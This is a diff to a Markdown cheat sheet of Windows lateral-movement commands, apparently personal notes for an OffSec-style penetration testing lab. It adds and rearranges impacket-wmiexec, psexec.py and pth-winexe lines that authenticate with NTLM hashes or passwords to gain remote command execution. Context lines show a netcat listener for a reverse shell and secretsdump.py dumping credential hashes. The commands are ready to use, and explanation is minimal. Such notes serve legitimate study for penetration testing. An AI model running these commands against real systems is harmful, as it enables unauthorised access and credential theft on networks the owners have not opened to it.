@@ -182,6 +182,10 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
 nc -lnvp 443
 ```
+```
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+/usr/bin/impacket-wmiexec domain/Administrator:password@192.168.50.73
+```
 ###### Winrm(domain user needs to be part of the Administrators or Remote Management Users group on the target host,5985,5986)
 ```
 Testing:
@@ -205,12 +209,12 @@ Enter-PSSession 1(id)
 ```
 /usr/share/doc/python3-impacket/examples/secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
 ```
-###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
+###### Other Tools
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+
 /usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5"
-/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
-xfreerdp /u:<user> /d:<domain>(if this user is localuser,do not specify domain!!!!!) /pth:<hash> /p:<password> /v:<ipAddr> /cert-ignore
+/usr/share/doc/python3-impacket/examples/psexec.py domain/Administrator:password@192.168.1.140
 ```
 
 ###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
